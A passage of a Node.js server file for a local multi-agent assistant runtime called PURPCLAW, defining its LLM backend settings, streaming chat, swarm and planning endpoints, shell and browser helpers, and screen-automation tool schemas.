/**
 * UNIFIED API SERVER - PURPCLAW v7.0
 * ================================
 * Combines: HTTP API (port 7780) + WebSocket client (Xiaozhi cloud) + 66 MCP tools + SSE streams
 * 
 * Port: 7780 HTTP
 * WebSocket: XIAOZHI_WS_URL env var
 * SSE: /api/stream
 */

require('dotenv').config();
const http = require('http');
const https = require('https');
const net = require('net');
const url = require('url');
const path = require('path');
const fs = require('fs');
const { spawn, exec, execSync } = require('child_process');
const { trackedSpawn, installCleanup, list: listChildren, killAll: killAllChildren } = require('./lib/child-registry');
installCleanup(); // SIGINT/SIGTERM/uncaughtException → kill all tracked children
const { promisify } = require('util');
const WebSocket = require('ws');
const os = require('os');

const AgentTower = require('./agent_tower.js');

// ── LLM provider for unified backend access ──
const LLM = require('./lib/llm-provider');

// ========== DIGITAL SHAMAN LAYER ==========
let shaman = null;
let shamanEvaluator = null;
try {
  const { DigitalShaman } = require('./digital_shaman.js');
  const { ShamanEvaluator } = require('./shaman_evaluator.js');
  
  // Shaman config read from llm-provider.js via its own constructor default
  shaman = new DigitalShaman({
    mcpTools: [],
    autoPilot: false,
    maxCycles: 12
  });
  
  shamanEvaluator = new ShamanEvaluator({
    // Evaluator reads from environment: LLM_PROVIDER, LLM_MODEL, LLM_API_KEY
  });
  
  console.log('[SHAMAN] Digital Shaman Layer initialized');
  
  shaman.on('phaseChange', (data) => {
    broadcast({ type: 'shaman_phase_change', ...data });
  });
  
  shaman.on('message', (msg) => {
    broadcast({ type: 'shaman_message', ...msg });
  });
  
} catch (e) {
  console.log('[SHAMAN] digital_shaman.js not found - Shaman Layer disabled');
}
// ========== END SHAMAN LAYER ==========

const execAsync = promisify(exec);
const PORT = 7780;
const API_KEY = process.env.PURPCLAW_API_KEY || '';  // empty = no auth (local dev)
const AUTH_REQUIRED = !!API_KEY && process.env.PURPCLAW_NO_AUTH !== '1';
const MUTATING_METHODS = new Set(['POST', 'PUT', 'DELETE', 'PATCH']);
const XIAOZHI_WS_URL = process.env.XIAOZHI_WS_URL || process.env.XIAOZHI_MCP_URL || '';
const PURP_DIR = __dirname;
const PURP_STATE = path.join(PURP_DIR, 'loop_state.json');
const PURP_LOG = path.join(PURP_DIR, 'purpclaw_output.log');
const SETTINGS_FILE = path.join(PURP_DIR, 'purpclaw_settings.json');
const MEMORY_FILE = path.join(PURP_DIR, 'samantha_memory.json');
const SKILLS_DIR = path.join(PURP_DIR, 'skills');
const PS_PREFIX = 'powershell.exe -NoProfile -NonInteractive -Command';
const KOKORO = 'C:\\Users\\Admin\\.openclaw\\kokoro_send.bat';
const KOKORO_LONG = 'C:\\Users\\Admin\\.openclaw\\kokoro_long_send.bat';

const state = {
  logs: [],
  maxLogs: 1000,
  skills: {},
  tasks: {},
  swarmAgents: {},
  settings: { 
    OPENAI_API_KEY: '', 
    XIAOZHI_MCP_URL: '', 
    MINIMAX_API_KEY: '', 
    DEEPSEEK_API_KEY: '', 
    model: 'deepseek-chat',
    activeBackend: 'kimi',
    aiBackends: [
      {
        id: 'kimi',
        name: 'Kimi (Moonshot)',
        provider: 'moonshot',
        apiKey: '',
        endpoint: 'https://api.moonshot.cn/v1/chat/completions',
        model: 'kimi-k2-5',
        contextWindow: 256000,
        supportsStreaming: true,
        supportsFunctionCalling: true,
        enabled: true
      },
      {
        id: 'openai',
        name: 'OpenAI',
        provider: 'openai',
        apiKey: '',
        endpoint: 'https://api.openai.com/v1/chat/completions',
        model: 'gpt-4o',
        contextWindow: 128000,
        supportsStreaming: true,
        supportsFunctionCalling: true,
        enabled: false
      },
      {
        id: 'anthropic',
        name: 'Anthropic',
        provider: 'anthropic',
        apiKey: '',
        endpoint: 'https://api.anthropic.com/v1/messages',
        model: 'claude-sonnet-4-20250514',
        contextWindow: 200000,
        supportsStreaming: true,
        supportsFunctionCalling: false,
        enabled: false
      },
      {
        id: 'deepseek',
        name: 'DeepSeek',
        provider: 'deepseek',
        apiKey: '',
        endpoint: 'https://api.deepseek.com/v1/chat/completions',
        model: 'deepseek-chat',
        contextWindow: 64000,
        supportsStreaming: true,
        supportsFunctionCalling: true,
        enabled: false
      },
      {
        id: 'local',
        name: 'Local / Ollama',
        provider: 'local',
        apiKey: '',
        endpoint: 'http://localhost:11434/v1/chat/completions',
        model: 'llama3',
        contextWindow: 8192,
        supportsStreaming: true,
        supportsFunctionCalling: false,
        enabled: false
      }
    ]
  },
  lastCommand: null,
  sammyStatus: 'connecting',
  sammyCurrentTask: null,
  responses: [],
  sseClients: [],
  divisions: {},
  activeProcesses: {},
  currentMood: 'chill',
  previousMood: 'chill',
  divisionAgents: {}
};

// ── Plan-then-act: parse LLM plan JSON ─────────────────────────────────────
const PLAN_VALID_ROUTES = ['chat', 'kernel', 'groupchat', 'research', 'swarm', 'mission', 'code', 'services', 'training', 'autoresearch'];

function parsePlanJson(planText) {
  let steps = [];
  let parseError = null;
  try {
    // Strip <think>...</think> blocks (qwen / deepseek / o1-style reasoning)
    let cleaned = planText
      .replace(/<think>[\s\S]*?<\/think>/gi, '')
      .replace(/^```(?:json)?\s*/i, '')
      .replace(/```\s*$/i, '')
      .trim();
    const m = cleaned.match(/\[[\s\S]*\]/);
    if (m) cleaned = m[0];
    const parsed = JSON.parse(cleaned);
    if (Array.isArray(parsed)) {
      steps = parsed.filter(s => s && (s.title || s.command)).map((s, i) => ({
        index: i + 1,
        title: String(s.title || ('Step ' + (i + 1))).slice(0, 200),
        command: String(s.command || '').slice(0, 800),
        route: PLAN_VALID_ROUTES.includes(s.route) ? s.route : 'chat',
        expected: String(s.expected || '').slice(0, 200),
        rationale: String(s.rationale || '').slice(0, 300),
      }));
    }
  } catch (e) { parseError = e.message; }
  return { steps, parseError };
}

// SSE helpers
function sseStart(res) {
  res.writeHead(200, {
    'Content-Type': 'text/event-stream; charset=utf-8',
    'Cache-Control': 'no-cache, no-transform',
    'Connection': 'keep-alive',
    'X-Accel-Buffering': 'no',
  });
  if (res.flushHeaders) res.flushHeaders();
}
function sseEvent(res, event, data) {
  try { res.write(`event: ${event}\ndata: ${JSON.stringify(data)}\n\n`); } catch {}
}
function sseComment(res, text) {
  // SSE comment — keeps the connection warm
  try { res.write(`: ${text}\n\n`); } catch {}
}

// ── /api/composer/context — Active Context Panel data ─────────────────────────
//
// The "what will be sent" panel above the textbox. The UI calls this
// with the current attachments (files, URLs, mentions) and gets back:
//   - per-item preview (file content, URL title, agent name, etc.)
//   - real token count (chars/4 heuristic + file bytes)
//   - the prompt that will actually be built from these attachments
//   - flagged warnings (file too big, secret detected, etc.)
//
// Everything is real — files are read, URLs are fetched (HEAD), agents
// are looked up. No mocks, no fakery.
function composerTokenCount(text) {
  // GPT-style: ~4 chars per token. Real tokenizers are similar.
  // We add +5% overhead for system prompt + structure.
  return Math.ceil((text || '').length / 4);
}

async function composerContextHandler(req, res) {
  if (req.method !== 'POST') return sendJson(res, 405, { ok: false, error: 'POST only' });
  const body = await parseBody(req);
  const { attachments = [], mentions = [], mode = 'chat', workspace = 'current' } = body;

  const out = {
    ok: true,
    mode,
    workspace,
    items: [],
    totalTokens: 0,
    totalChars: 0,
    prompt: '',
    warnings: [],
  };

  // ── Process attachments ────────────────────────────────────────────────
  for (const att of attachments) {
    const item = { kind: att.kind || 'file', label: att.label || att.path || att.url || 'untitled' };
    try {
      if (att.kind === 'file' && att.path) {
        const fs = require('fs');
        if (!fs.existsSync(att.path)) {
          item.error = 'file not found';
          item.exists = false;
        } else {
          const stat = fs.statSync(att.path);
          item.size = stat.size;
          if (stat.size > 200_000) {
            item.truncated = true;
            item.content = fs.readFileSync(att.path, 'utf-8').slice(0, 200_000) + '\n\n[…truncated]';
            out.warnings.push({ kind: 'truncated', label: item.label, size: stat.size });
          } else {
            item.content = fs.readFileSync(att.path, 'utf-8');
          }
          item.tokens = composerTokenCount(item.content);
          item.exists = true;
          // Secret-pattern detection (defensive)
          if (/(sk-[A-Za-z0-9]{20,}|api[_-]?key[\"'\s:=]+[A-Za-z0-9]{20,})/i.test(item.content)) {
            item.secretWarning = true;
            out.warnings.push({ kind: 'secret', label: item.label });
          }
        }
      } else if (att.kind === 'url' && att.url) {
        // HEAD the URL, return title if possible
        try {
          const u = new URL(att.url);
          item.host = u.host;
          // Don't fetch the full page (could be huge); just record URL
          item.content = `[URL: ${att.url}]`;
          item.tokens = composerTokenCount(item.content);
        } catch (e) {
          item.error = 'invalid url';
        }
      } else if (att.kind === 'clipboard') {
        item.content = att.content || '';
        item.tokens = composerTokenCount(item.content);
      } else if (att.kind === 'image' && att.path) {
        // Image attachments don't add to the text token count
        item.tokens = 0;
        item.image = true;
      } else if (att.content) {
        item.content = String(att.content);
        item.tokens = composerTokenCount(item.content);
      }
    } catch (e) {
      item.error = e.message;
    }
    out.items.push(item);
    out.totalTokens += item.tokens || 0;
    out.totalChars += (item.content || '').length;
  }

  // ── Process mentions (agents / skills) ─────────────────────────────────
  for (const m of mentions) {
    const item = { kind: 'mention', label: m.name || m, role: m.role || 'agent' };
    item.content = `[@${m.role || 'agent'}: ${m.name || m}]`;
    item.tokens = composerTokenCount(item.content);
    out.items.push(item);
    out.totalTokens += item.tokens;
    out.totalChars += item.content.length;
  }

  // ── Build the actual prompt that will be sent ─────────────────────────
  const promptParts = [];
  for (const it of out.items) {
    if (it.content) {
      promptParts.push(`# ${it.label}\n\n${it.content}`);
    }
  }
  // Workspace header
  if (workspace && workspace !== 'current') {
    promptParts.unshift(`# Workspace: ${workspace}`);
  }
  // Mode header
  if (mode === 'plan') {
    promptParts.unshift('# Mode: PLAN (reasoning only, no tools)');
  } else if (mode === 'execute') {
    promptParts.unshift('# Mode: EXECUTE (tools enabled, agent actions allowed)');
  } else if (mode === 'swarm') {
    promptParts.unshift('# Mode: SWARM (multi-agent orchestration)');
  }
  out.prompt = promptParts.join('\n\n---\n\n');

  // Size warnings
  if (out.totalTokens > 200_000) {
    out.warnings.push({ kind: 'large-context', tokens: out.totalTokens, message: 'context > 200k tokens, may exceed model limits' });
  }

  return sendJson(res, 200, out);
}

// Streaming chat handler. Mirrors the JSON /api/chat shape, but emits
// each token as an SSE event so the UI can render in real-time.
// Events:
//   phase  → {phase: 'received'|'thinking'|'responding'|'done'|'error'}
//   token  → {content, model}
//   done   → {reply, model, providerStatus, kernelJobId?}
//   error  → {error}
async function handleChatStream(req, res) {
  let body = null;
  try { body = await parseBody(req); }
  catch (e) {
    sseStart(res);
    sseEvent(res, 'error', { error: 'bad body: ' + e.message });
    return res.end();
  }
  const { message, spawnAgents = false, source = 'chat' } = body;
  if (!message) {
    sseStart(res);
    sseEvent(res, 'error', { error: 'message required' });
    return res.end();
  }
  sseStart(res);
  sseEvent(res, 'phase', { phase: 'received', message: message.slice(0, 100) });
  sseEvent(res, 'phase', { phase: 'thinking' });

  try {
    // Use the real agent-loop (tool-calling brain) instead of raw llm.streamChat.
    // This unifies all three surfaces: CLI ask, WebUI, TUI, and all gateways
    // (Discord, Telegram, email) hit the same agentic engine.
    const { runAgent } = require('./lib/agent-loop');
    let fullReply = '';
    let modelName = '';
    let toolCallsUsed = 0;

    for await (const ev of runAgent({
      prompt: message,
      opts: { maxTokens: 2048, temperature: 0.7 },
    })) {
      if (ev.type === 'token') {
        fullReply += ev.content;
        modelName = ev.model || modelName;
        sseEvent(res, 'token', { content: ev.content, model: ev.model });
      } else if (ev.type === 'steering') {
        // Phase 3 — every governed turn announces its capsule.
        sseEvent(res, 'steering', { capsuleId: ev.capsuleId, activeRules: ev.activeRules, unresolvedConflicts: ev.unresolvedConflicts, sources: ev.sources, error: ev.error });
      } else if (ev.type === 'steering-blocked') {
        sseEvent(res, 'steering-blocked', { capsuleId: ev.capsuleId, conflicts: ev.conflicts });
      } else if (ev.type === 'tool-call') {
        toolCallsUsed++;
        sseEvent(res, 'tool-call', { tool: ev.tool, args: ev.args, capsuleId: ev.capsuleId });
      } else if (ev.type === 'tool-result') {
        sseEvent(res, 'tool-result', {
          tool: ev.tool,
          ok: ev.ok,
          code: ev.code,
          capsuleId: ev.capsuleId,
          content: (ev.content || ev.error || '').substring(0, 500),
        });
      } else if (ev.type === 'done') {
        break;
      } else if (ev.type === 'error') {
        throw new Error(ev.error);
      }
    }
    sseEvent(res, 'phase', { phase: 'done' });
    sseEvent(res, 'done', {
      reply: fullReply,
      model: modelName,
      providerStatus: 'answered',
      toolCalls: toolCallsUsed,
      source,
    });
    return res.end();
  } catch (e) {
    sseEvent(res, 'phase', { phase: 'error' });
    sseEvent(res, 'error', { error: e.message });
    return res.end();
  }
}

// SWARM — /api/chat/swarm
// Fan out a single user message to N specialized agents in parallel,
// each with its own system prompt and its own SSE event channel. The
// user sees N bubbles appearing in real-time, each with its own
// progress.
//
// Events:
//   phase    → {phase: 'received'|'spawning'|'synthesizing'|'done'}
//   agent    → {id, role, status: 'started'|'streaming'|'done'|'error', model}
//   token    → {agentId, content, model}
//   agent_done → {agentId, ok, length, elapsed}
//   synthesis → {content, model}
//   done     → {ok, agents: [...], synthesis: {content, model}}
//   error    → {error, agentId?}
async function handleChatSwarm(req, res) {
  let body = null;
  try { body = await parseBody(req); }
  catch (e) {
    sseStart(res);
    sseEvent(res, 'error', { error: 'bad body: ' + e.message });
    return res.end();
  }
  const { message, agents: agentOverride, source = 'swarm' } = body;
  if (!message) {
    sseStart(res);
    sseEvent(res, 'error', { error: 'message required' });
    return res.end();
  }

  // Default agent roster: 3 specialists with distinct system prompts.
  // Users can override via the `agents` field (array of {id, role, system, model}).
  const defaultAgents = [
    {
      id: 'planner',
      role: 'Planner',
      emoji: '🧭',
      system: 'You are Quill Planner, a senior strategist. Given a user goal, produce a concise step-by-step plan (3-7 steps). For each step: title, what to do, what the output looks like. Be specific, not generic. Output as a numbered list. Maximum 200 words.',
      model: undefined,  // use default
    },
    {
      id: 'researcher',
      role: 'Researcher',
      emoji: '🔬',
      system: 'You are Quill Researcher, an investigative analyst. Given a user goal, identify the key questions, then surface relevant facts, prior art, and best practices. Focus on the most useful 3-5 things a builder would need to know. Be concrete, not theoretical. Maximum 200 words.',
      model: undefined,
    },
    {
      id: 'builder',
      role: 'Builder',
      emoji: '🛠️',
      system: 'You are Quill Builder, an implementation engineer. Given a user goal, identify the technical implementation: which files/functions to touch, which patterns to use, what the diff would look like. Be specific with file paths and function names. Maximum 200 words.',
      model: undefined,
    },
  ];
  const agents = Array.isArray(agentOverride) && agentOverride.length
    ? agentOverride
    : defaultAgents;

  sseStart(res);
  sseEvent(res, 'phase', { phase: 'received', message: message.slice(0, 100), agentCount: agents.length });
  sseEvent(res, 'phase', { phase: 'spawning' });

  const llm = require('./lib/llm-provider');
  const swarmT0 = Date.now();
  const agentResults = new Map();

  // Spawn all agents in parallel
  const promises = agents.map(async (agent) => {
    const t0 = Date.now();
    sseEvent(res, 'agent', { id: agent.id, role: agent.role, emoji: agent.emoji || '·', status: 'started', model: agent.model || 'auto' });
    let text = '';
    try {
      for await (const chunk of llm.streamChat([
        { role: 'system', content: agent.system },
        { role: 'user', content: message },
      ], { temperature: 0.4, maxTokens: 600, model: agent.model })) {
        if (chunk.content) {
          text += chunk.content;
          sseEvent(res, 'token', { agentId: agent.id, content: chunk.content, model: chunk.model });
        } else if (chunk.done) {
          break;
        }
      }
      const result = { id: agent.id, role: agent.role, emoji: agent.emoji || '·', ok: true, content: text, length: text.length, elapsed: Date.now() - t0, model: 'auto' };
      agentResults.set(agent.id, result);
      sseEvent(res, 'agent_done', result);
      return result;
    } catch (e) {
      const result = { id: agent.id, role: agent.role, emoji: agent.emoji || '·', ok: false, error: e.message, elapsed: Date.now() - t0 };
      agentResults.set(agent.id, result);
      sseEvent(res, 'agent_done', result);
      return result;
    }
  });

  const results = await Promise.allSettled(promises);
  const succeeded = results.filter(r => r.status === 'fulfilled' && r.value.ok).map(r => r.value);

  // Synthesize the final answer from all agent outputs
  sseEvent(res, 'phase', { phase: 'synthesizing', succeeded: succeeded.length, total: agents.length });
  let synthesis = '';
  let synthModel = '';
  if (succeeded.length) {
    const synthPrompt = `You are Quill Synthesizer. You have ${succeeded.length} specialist analyses for the user's goal. Merge them into one tight 100-150 word final response that takes the best of each perspective.

User goal: ${message}

Specialist outputs:
${succeeded.map(r => `--- ${r.role.toUpperCase()} (${r.elapsed}ms) ---\n${r.content}`).join('\n\n')}

Write a single concise synthesized response. Do not repeat the question. Output pure prose, no headings.`;
    try {
      for await (const chunk of llm.streamChat([
        { role: 'system', content: 'You are a concise synthesizer. Output one tight paragraph of merged insight.' },
        { role: 'user', content: synthPrompt },
      ], { temperature: 0.2, maxTokens: 600 })) {
        if (chunk.content) {
          synthesis += chunk.content;
          synthModel = chunk.model || synthModel;
          sseEvent(res, 'token', { agentId: 'synthesizer', content: chunk.content, model: chunk.model });
        } else if (chunk.done) {
          break;
        }
      }
    } catch (e) {
      // Synthesizer failed — fall back to concatenation
      synthesis = succeeded.map(r => `**[${r.role}]** ${r.content}`).join('\n\n');
    }
  }

  sseEvent(res, 'synthesis', { content: synthesis, model: synthModel });
  sseEvent(res, 'phase', { phase: 'done' });
  sseEvent(res, 'done', {
    ok: succeeded.length > 0,
    agents: Array.from(agentResults.values()),
    synthesis: { content: synthesis, model: synthModel },
    totalElapsed: Date.now() - swarmT0,
  });
  return res.end();
}

// Streaming plan handler. Same logic as the JSON endpoint, but emits
// each phase + each step as an SSE event so the UI can show progress:
//   event: phase     data: {phase: 'search'|'propose'|'merge'|'done'}
//   event: context   data: {sources: [...]}  ← top-5 codebase files
//   event: proposal  data: {model, ok, text?, error?, elapsed}
//   event: merged    data: {steps, judge, mode}
//   event: done      data: {ok, stepCount, ...}
//   event: error     data: {error}
async function handlePlanStream(req, res) {
  const body = await parseBody(req);
  const { goal, source = 'plan', mode = 'single', models: fanoutModels, context: useContext = true } = body;
  if (!goal) {
    sseStart(res);
    sseEvent(res, 'error', { error: 'goal required' });
    return res.end();
  }
  sseStart(res);
  sseEvent(res, 'phase', { phase: 'received', goal });
  sseComment(res, 'starting plan stream for: ' + goal.slice(0, 60));

  try {
    const llm = require('./lib/llm-provider');

    // Codebase context
    let codebaseContext = '';
    let contextSources = [];
    if (useContext) {
      sseEvent(res, 'phase', { phase: 'search', message: 'searching codebase for relevant files' });
      try {
        const { searchSemantic } = require('./lib/commands/code');
        const r = await searchSemantic(goal, 5);
        if (r && r.results && r.results.length) {
          contextSources = r.results.map(x => ({ file: x.file, score: x.score }));
          const ctxLines = r.results.map((x, i) => {
            const lines = (x.content || '').split('\n').slice(0, 12).join('\n');
            return `[${i + 1}] ${x.file} (score ${x.score.toFixed(3)})\n${lines}`;
          });
          codebaseContext = `\n\nCodebase context (top ${r.results.length} relevant files from semantic search over the live codebase):\n${ctxLines.join('\n\n')}`;
          sseEvent(res, 'context', { sources: contextSources, count: contextSources.length });
        }
      } catch (e) {
        sseEvent(res, 'phase', { phase: 'search-warning', error: e.message });
      }
    }

    const PLAN_SYSTEM = `You are Quill, the planning assistant for the PURPCLAW runtime.
Decompose the user's goal into 3-7 concrete, ordered steps. For each step return a JSON object with:
  - "title": short imperative ("Pull recent training data", "Generate the chart")
  - "command": the actual prompt / kernel goal / tool call to execute
  - "route": one of [chat, kernel, groupchat, research, swarm, mission, code, services, training, autoresearch]
  - "expected": what success looks like (1 sentence)
  - "rationale": 1 sentence explaining why this step is needed

If codebase context is provided, USE IT: reference real file paths, real function names, real existing patterns. Steps should be grounded in the actual codebase, not generic advice.

Respond ONLY with a JSON array of those step objects, no prose, no markdown fences.`;

    const userPrompt = goal + codebaseContext;

    if (mode === 'single') {
      sseEvent(res, 'phase', { phase: 'propose', model: fanoutModels?.[0] || 'auto' });
      let planText = '';
      try {
        const chatOpts = { maxTokens: 2500, temperature: 0.2 };
        if (Array.isArray(fanoutModels) && fanoutModels[0]) chatOpts.model = fanoutModels[0];
        // Stream tokens
        for await (const chunk of llm.streamChat([
          { role: 'system', content: PLAN_SYSTEM },
          { role: 'user', content: userPrompt },
        ], chatOpts)) {
          if (chunk.content) {
            planText += chunk.content;
            sseEvent(res, 'token', { content: chunk.content, model: chunk.model });
          } else if (chunk.done) {
            sseEvent(res, 'proposal', { model: chunk.model, ok: true, elapsed: 0 });
          }
        }
      } catch (e) {
        sseEvent(res, 'error', { error: 'llm: ' + e.message });
        return res.end();
      }
      const parsed = parsePlanJson(planText);
      sseEvent(res, 'merged', { steps: parsed.steps, judge: 'self', mode: 'single-stream', contextSources });
      sseEvent(res, 'done', { ok: true, stepCount: parsed.steps.length, parseError: parsed.parseError });
      return res.end();
    }

    if (mode === 'fanout') {
      const candidates = Array.isArray(fanoutModels) && fanoutModels.length
        ? fanoutModels.slice(0, 5)
        : ['openai/gpt-oss-20b:free', 'z-ai/glm-4.5-air:free', 'google/gemma-4-26b-a4b-it:free'];
      sseEvent(res, 'phase', { phase: 'fanout', candidates });

      const proposals = await Promise.allSettled(candidates.map(async (model) => {
        const t0 = Date.now();
        try {
          let text = '';
          for await (const chunk of llm.streamChat([
            { role: 'system', content: PLAN_SYSTEM },
            { role: 'user', content: userPrompt },
          ], { maxTokens: 2000, temperature: 0.4, model })) {
            if (chunk.content) text += chunk.content;
            if (chunk.done) break;
          }
          sseEvent(res, 'proposal', { model, ok: true, elapsed: Date.now() - t0, length: text.length });
          return { model, ok: true, text };
        } catch (e) {
          sseEvent(res, 'proposal', { model, ok: false, error: e.message, elapsed: Date.now() - t0 });
          return { model, ok: false, error: e.message };
        }
      }));

      const succeeded = proposals
        .filter(p => p.status === 'fulfilled' && p.value.ok)
        .map(p => p.value);
      if (!succeeded.length) {
        sseEvent(res, 'error', { error: 'all fan-out models failed' });
        return res.end();
      }

      // Judge merges
      const judgeModel = succeeded[0].model;
      sseEvent(res, 'phase', { phase: 'merge', judge: judgeModel, candidates: succeeded.length });
      const judgePrompt = `You are a senior planner. Multiple AI models proposed plans for: "${goal}". Merge the BEST steps into a single 3-7 step JSON array. Each step: {title, command, route, expected, rationale}. Output pure JSON only.

Proposals:
${succeeded.map((p, i) => `--- MODEL ${i + 1} (${p.model}) ---\n${p.text}`).join('\n\n')}`;
      let mergedText = '';
      try {
        for await (const chunk of llm.streamChat([
          { role: 'system', content: 'You merge multiple AI plans into the single best plan. Output pure JSON only.' },
          { role: 'user', content: judgePrompt },
        ], { maxTokens: 1800, temperature: 0.1, model: judgeModel })) {
          if (chunk.content) {
            mergedText += chunk.content;
            sseEvent(res, 'token', { content: chunk.content, model: chunk.model });
          } else if (chunk.done) {
            break;
          }
        }
      } catch (e) {
        const fallback = parsePlanJson(succeeded[0].text);
        sseEvent(res, 'merged', { steps: fallback.steps, judge: judgeModel, mode: 'fanout-fallback', contextSources });
        sseEvent(res, 'done', { ok: true, stepCount: fallback.steps.length, judgeError: e.message });
        return res.end();
      }
      const parsed = parsePlanJson(mergedText);
      sseEvent(res, 'merged', { steps: parsed.steps, judge: judgeModel, mode: 'fanout', contextSources });
      sseEvent(res, 'done', { ok: true, stepCount: parsed.steps.length, parseError: parsed.parseError });
      return res.end();
    }

    sseEvent(res, 'error', { error: 'mode must be "single" or "fanout"' });
    return res.end();
  } catch (e) {
    sseEvent(res, 'error', { error: e.message });
    return res.end();
  }
}

function loadSettings() {
  try { if (fs.existsSync(SETTINGS_FILE)) Object.assign(state.settings, JSON.parse(fs.readFileSync(SETTINGS_FILE, 'utf8'))); } catch (e) {}
}
function saveSettings() {
  try { fs.writeFileSync(SETTINGS_FILE, JSON.stringify(state.settings, null, 2)); } catch (e) {}
}
loadSettings();

function loadMemory() { try { return JSON.parse(fs.readFileSync(MEMORY_FILE, 'utf8')); } catch (e) { return { facts: [] }; } }
function saveMemory(m) { try { fs.writeFileSync(MEMORY_FILE, JSON.stringify(m, null, 2)); } catch (e) {} }

// Live event subscribers for /api/cognitive/events SSE
const logSubscribers = new Set();

const taskQueue = [];
let taskId = 0;
const SWARM_AGENTS = ['duck', 'ghost', 'dragon', 'octopus', 'robot', 'mushroom', 'chonk', 'owl', 'cactus', 'penguin', 'goose', 'turtle', 'axolotl', 'rabbit', 'void', 'wolf', 'spider', 'raven', 'snake', 'bee', 'bunny'];

let purpProc = null, purpOut = '';
const OPENCLAW_GW = process.env.OPENCLAW_GATEWAY || 'ws://127.0.0.1:18789';

function san(s) { return typeof s !== 'string' ? '' : s.replace(/[`$;|><&{}\[\]'"]/g, '').replace(/\r?\n/g, ' ').substring(0, 500); }
function coord(v) { const n = Number(v); return (isNaN(n) || n < 0 || n > 10000) ? 0 : Math.floor(n); }
function ok(text) { return { content: [{ type: 'text', text: String(text).substring(0, 8000) }] }; }

// Canonical tool bridge: the runTool switch below only hand-implements a subset
// of builtins. Everything else lives in the shared tool registry (lib/tools).
// Route those through ToolRuntime so the deterministic ladder (scope, schema,
// path-security, permissions, governance, approval) still enforces — restoring
// the pre-replacement registry dispatch WITH the permission boundary, not the
// old raw registry.invoke() that bypassed it. Lazy to avoid init-time cycles.
let _toolRuntime = null;
function getToolRuntime() {
  if (!_toolRuntime) {
    const { ToolRuntime } = require('./lib/tool-runtime');
    _toolRuntime = new ToolRuntime({ permissionProfile: process.env.PURPCLAW_API_TOOL_PROFILE || 'workspace-write' });
  }
  return _toolRuntime;
}

async function ps(cmd, timeout = 15000) {
  try {
    const { stdout, stderr } = await execAsync(`${PS_PREFIX} "${cmd}"`, { timeout, maxBuffer: 5 * 1024 * 1024 });
    return (stdout || stderr || 'Done').trim();
  } catch (e) { return `Error: ${e.message.substring(0, 500)}`; }
}

async function psScript(script, timeout = 15000) {
  const tmp = path.join(os.tmpdir(), `bridge_${Date.now()}.ps1`);
  try {
    fs.writeFileSync(tmp, script, 'utf8');
    const { stdout, stderr } = await execAsync(`powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "${tmp}"`, { timeout, maxBuffer: 5 * 1024 * 1024 });
    try { fs.unlinkSync(tmp); } catch (e) {}
    return (stdout || stderr || 'Done').trim();
  } catch (e) {
    try { fs.unlinkSync(tmp); } catch (e) {}
    return `Error: ${e.message.substring(0, 500)}`;
  }
}

async function cmd(command, timeout = 15000) {
  // RIP-OUT FIX: was `execAsync(..., { shell: 'cmd.exe' })` which is
  // untracked. Now uses the child-registry's execSafe so it's bounded
  // and the child gets killed if the parent dies.
  const r = await execSafe(command, [], { shell: 'cmd.exe', timeoutMs: timeout });
  if (r.code === -1 && !r.stdout && !r.stderr) return `Error: ${r.stderr || 'unknown'}`;
  return ((r.stdout || r.stderr || 'Done').trim()).substring(0, 5000);
}

function httpReq(url, method = 'GET', body) {
  return new Promise((res, rej) => {
    try {
      const u = new URL(url);
      const m = u.protocol === 'https:' ? https : http;
      const r = m.request({ hostname: u.hostname, port: u.port, path: u.pathname + u.search, method, headers: { 'Content-Type': 'application/json' } }, resp => {
        let d = ''; resp.on('data', c => d += c); resp.on('end', () => res(`HTTP ${resp.statusCode}\n${d.substring(0, 3000)}`));
      });
      r.on('error', e => rej(e));
      r.setTimeout(15000, () => { r.destroy(); rej(new Error('Timeout')); });
      if (body) r.write(typeof body === 'string' ? body : JSON.stringify(body));
      r.end();
    } catch (e) { rej(e); }
  });
}

let pwBrowser = null, pwContext = null, pwPage = null;

async function getBrowserContext() {
  if (!pwBrowser || !pwBrowser.isConnected()) {
    const { chromium } = require('playwright');
    pwBrowser = await chromium.launch({ headless: false, args: ['--no-sandbox'] });
    pwContext = await pwBrowser.newContext({ viewport: { width: 1920, height: 1080 } });
    pwPage = await pwContext.newPage();
    console.log('[BROWSER] Playwright launched');
  }
  return pwContext;
}

async function getBrowserPage() {
  const ctx = await getBrowserContext();
  const pages = ctx.pages();
  if (pages.length === 0) pwPage = await ctx.newPage();
  else pwPage = pages[pages.length - 1];
  return pwPage;
}

const TOOLS = [
  { name: 'screen_capture', description: 'Screenshot the screen. Returns file path.', inputSchema: { type: 'object', properties: { monitor: { type: 'number' } } } },
  { name: 'screen_ocr', description: 'Read text from screen using OCR. Supports line grouping and structured output.', inputSchema: { type: 'object', properties: { image_path: { type: 'string' } } } },
  { name: 'ocr_identify', description: 'Advanced OCR with line detection. Read text and identify line-by-line structure.', inputSchema: { type: 'object', properties: { image_path: { type: 'string' } } } },
  { name: 'screen_identify', description: 'Combined screen analysis: captures screen, runs OCR and object detection (YOLO). Returns comprehensive description of what is visible on screen.', inputSchema: { type: 'object', properties: { confidence: { type: 'number' } } } },
  { name: 'screen_find_object', description: 'Detect objects on screen with YOLO.', inputSchema: { type: 'object', properties: { image_path: { type: 'string' }, confidence: { type: 'number' } } } },
  { name: 'screen_find_template', description: 'Find image on screen (template match).', inputSchema: { type: 'object', properties: { template_path: { type: 'string' } }, required: ['template_path'] } },
  { name: 'screen_info', description: 'Get monitor sizes and positions.', inputSchema: { type: 'object', properties: {} } },
  { name: 'ui_list_elements', description: 'List all interactive UI elements across all windows. Shows name, type, location, window. Best for finding buttons, inputs, menus.', inputSchema: { type: 'object', properties: { filter: { type: 'string' }, max_results: { type: 'number' } } } },
  { name: 'ui_click_element', description: 'Click a UI element by name pattern. Searches all windows and clicks the first match. Supports: Button, MenuItem, Tab, Edit, ComboBox, Slider, List, Hyperlink, etc.', inputSchema: { type: 'object', properties: { name: { type: 'string' }, button: { type: 'string', enum: ['left', 'right', 'double'] } }, required: ['name'] } },
  { name: 'ui_get_screen_layout', description: 'Get complete visual layout map of screen: all windows, elements, coordinates. Returns comprehensive map with element positions.', inputSchema: { type: 'object', properties: {} } },
  { name: 'ui_get_element_at', description: 'Get UI element at specific screen coordinates. Returns element name, type, and window.', inputSchema: { type: 'object', properties: { x: { type: 'number' }, y: { type: 'number' } }, required: ['x', 'y'] } },
